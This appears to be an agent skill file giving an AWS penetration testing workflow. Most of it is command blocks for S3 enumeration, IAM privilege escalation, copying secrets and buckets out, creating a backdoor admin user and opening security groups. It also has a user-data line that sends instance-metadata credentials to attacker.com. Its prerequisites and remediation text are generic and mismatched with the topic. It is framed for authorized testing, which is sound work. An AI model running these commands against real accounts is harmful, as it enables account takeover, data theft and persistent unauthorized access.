---
name: aws-cloud-penetration-testing
description: >
  Penetration test AWS cloud environments for misconfigurations, privilege escalation, data exposure,
  and lateral movement. Use this skill when assessing AWS accounts for security weaknesses including
  S3 bucket misconfigurations, IAM policy flaws, EC2 metadata exploitation, Lambda function abuse,
  and cross-account attack paths. Covers both external and authenticated AWS pentesting.
domain: cybersecurity
subdomain: penetration-testing
category: Infrastructure
difficulty: advanced
estimated_time: "4-8 hours"
mitre_attack:
  tactics: [TA0001, TA0004, TA0007, TA0009]
  techniques: [T1580, T1078.004, T1552.005]
platforms: [linux, windows, macos]
tags: [aws, cloud-security, s3-bucket, iam, ec2-metadata, cloud-pentest, privilege-escalation, cloud-hacking]
tools: [pacu, prowler, enumerate-iam, awscli, scoutsuite]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# AWS Cloud Penetration Testing

## When to Use
- When conducting authorized security assessments of AWS environments
- When testing for cloud misconfigurations and data exposure
- When assessing IAM policies for privilege escalation paths
- When testing EC2, S3, Lambda, RDS, and other AWS services for vulnerabilities
- After obtaining AWS credentials (access key + secret) in a pentest/red team


## Prerequisites
- Shell access (user or limited privilege) on the target system
- Enumeration tools appropriate for the target OS (LinPEAS, WinPEAS, etc.)
- Understanding of the target OS privilege model and common misconfigurations
- Ability to transfer files or compile tools on the target

## Workflow

### Phase 1: External Reconnaissance (No Credentials)

```bash
# S3 Bucket discovery
# Common bucket naming patterns: company-backup, company-data, company-dev
aws s3 ls s3://target-company-backup --no-sign-request 2>/dev/null
aws s3 ls s3://target-company-data --no-sign-request 2>/dev/null

# Automated S3 bucket finder
# cloud_enum — multi-cloud enumeration
python3 cloud_enum.py -k target-company

# Check for publicly readable S3 objects
aws s3 cp s3://bucket-name/file.txt . --no-sign-request

# Check for publicly writable S3 buckets (CRITICAL)
echo "test" | aws s3 cp - s3://bucket-name/test.txt --no-sign-request

# EC2 instance discovery via Shodan/Censys
# Search: org:"Target Company" service:aws
```

### Phase 2: Credential Exploitation

```bash
# If you obtained AWS credentials (from .env, source code, SSRF, etc.):

# Configure credentials
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_DEFAULT_REGION="us-east-1"

# Identify who you are
aws sts get-caller-identity

# Enumerate IAM permissions (what can we do?)
# enumerate-iam tool
python3 enumerate-iam.py --access-key $AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY

# Check attached policies
aws iam list-attached-user-policies --user-name USERNAME
aws iam list-user-policies --user-name USERNAME
aws iam get-user-policy --user-name USERNAME --policy-name POLICY

# Check group memberships
aws iam list-groups-for-user --user-name USERNAME

# List roles (for role assumption)
aws iam list-roles | grep -i "AssumeRole"
```

### Phase 3: IAM Privilege Escalation

```bash
# 21+ known IAM privilege escalation paths
# See: https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation

# Path 1: iam:CreatePolicyVersion
# Create a new version of existing policy with admin access
aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/NAME \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# Path 2: iam:AttachUserPolicy
# Attach AdministratorAccess to yourself
aws iam attach-user-policy --user-name USERNAME \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Path 3: iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
# Create Lambda with privileged role, invoke to escalate
aws lambda create-function --function-name privesc \
  --runtime python3.9 --handler index.handler \
  --role arn:aws:iam::ACCOUNT:role/AdminRole \
  --zip-file fileb://payload.zip

# Path 4: iam:PassRole + ec2:RunInstances
# Launch EC2 with privileged instance profile
aws ec2 run-instances --image-id ami-xxx --instance-type t2.micro \
  --iam-instance-profile Name=AdminProfile \
  --user-data "#!/bin/bash\ncurl http://attacker.com/collect?creds=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole)"

# Automated privesc: PACU
# python3 pacu.py
# > run iam__privesc_scan
```

### Phase 4: Data Exfiltration & Lateral Movement

```bash
# S3 data access
aws s3 ls  # List all buckets
aws s3 ls s3://sensitive-bucket --recursive
aws s3 sync s3://sensitive-bucket /tmp/exfil/

# RDS/Database access
aws rds describe-db-instances
# Connect to exposed databases

# EC2 instances — SSH keys, user data
aws ec2 describe-instances --output table
aws ec2 get-launch-template-data --launch-template-id lt-xxx
aws ec2 describe-instance-attribute --instance-id i-xxx --attribute userData

# Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id SECRET_NAME

# SSM Parameter Store
aws ssm describe-parameters
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption

# Lambda functions — read source code
aws lambda list-functions
aws lambda get-function --function-name FUNC_NAME
# Download and analyze source code for hardcoded secrets

# Cross-account access
aws sts assume-role --role-arn arn:aws:iam::OTHER_ACCOUNT:role/CrossAccountRole \
  --role-session-name pentest
```

### Phase 5: Post-Exploitation & Persistence

```bash
# Create backdoor IAM user
aws iam create-user --user-name monitoring-svc
aws iam attach-user-policy --user-name monitoring-svc \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name monitoring-svc

# Create backdoor Lambda (for persistent access)
# Lambda function that creates new access keys on demand

# Modify security groups (open additional ports)
aws ec2 authorize-security-group-ingress --group-id sg-xxx \
  --protocol tcp --port 22 --cidr 0.0.0.0/0

# Disable CloudTrail (cover tracks — NOT recommended in authorized tests)
# aws cloudtrail stop-logging --name default
# WARNING: This is destructive and should only be simulated, not executed
```

### Phase 6: Automated Scanning

```bash
# Prowler — AWS security assessment tool
pip install prowler
prowler aws

# ScoutSuite — multi-cloud assessment
python3 scout.py aws

# PACU — AWS exploitation framework
python3 pacu.py
# > run s3__bucket_finder
# > run iam__enum_permissions
# > run iam__privesc_scan
# > run ec2__enum
# > run lambda__enum
```

## 🔵 Blue Team Detection
- **CloudTrail**: Enable in all regions, send to centralized S3 bucket
- **GuardDuty**: Enable for threat detection
- **Config**: Track resource configuration changes
- **Access Analyzer**: Identify over-permissive IAM policies
- **SCPs**: Apply Service Control Policies to limit dangerous actions
- **Credential rotation**: Rotate access keys every 90 days

## Key Concepts
| Concept | Description |
|---------|-------------|
| IAM | Identity and Access Management — AWS's permission system |
| Instance metadata | Internal service (169.254.169.254) exposing credentials to EC2 instances |
| AssumeRole | Temporarily acquiring permissions of another IAM role |
| S3 bucket policy | Access controls on S3 storage buckets |
| PACU | AWS exploitation framework for penetration testing |
| Privilege escalation | Gaining higher-level permissions through IAM misconfigurations |

## Output Format
```
AWS Cloud Pentest Report
=========================
Target: Account ID 123456789012
Credentials Used: AKIA[REDACTED] (leaked from GitHub)

Critical Findings:
1. S3 bucket "company-backups" publicly readable — contains database dumps
2. IAM user has iam:CreatePolicyVersion — escalated to full admin
3. Secrets Manager contains plaintext database passwords
4. CloudTrail disabled in 3 regions (no audit trail)
5. 12 Lambda functions contain hardcoded API keys in source code
```

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- AWS: [Penetration Testing Policy](https://aws.amazon.com/security/penetration-testing/)
- HackTricks: [AWS Pentesting](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security)
- PACU: [AWS Exploitation Framework](https://github.com/RhinoSecurityLabs/pacu)
- Prowler: [AWS Security Tool](https://github.com/prowler-cloud/prowler)
